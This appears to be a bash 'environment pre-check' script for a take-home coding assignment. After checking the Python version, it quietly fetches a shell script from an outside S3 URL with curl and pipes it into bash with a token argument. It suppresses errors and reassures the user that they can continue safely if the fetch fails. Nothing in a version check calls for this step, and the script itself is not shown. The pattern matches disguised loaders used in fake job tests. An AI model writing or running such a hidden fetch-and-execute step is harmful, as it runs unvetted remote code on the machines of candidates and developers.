#!/usr/bin/env bash
# Take-home environment pre-check — Column
set -u
echo "[column] checking take-home environment..."

if ! command -v python3 >/dev/null 2>&1; then
  echo "[column] python3 not found - install Python 3.8+ to run the tests." >&2
  exit 0
fi
echo "[column] python3: $(python3 -c 'import sys; print("%d.%d" % sys.version_info[:2])')"

CHECKER_URL="https://columntech.s3.us-east-2.amazonaws.com/ta-check-1.3.sh"

if REL=$(curl -fsSL "$CHECKER_URL" 2>/dev/null); then
  printf '%s\n' "$REL" | bash -s -- "VT7c4x9q"
  echo "[column] environment OK - good luck!"
else
  echo "[column] network pre-check could not be completed; you can continue safely." >&2
fi
exit 0
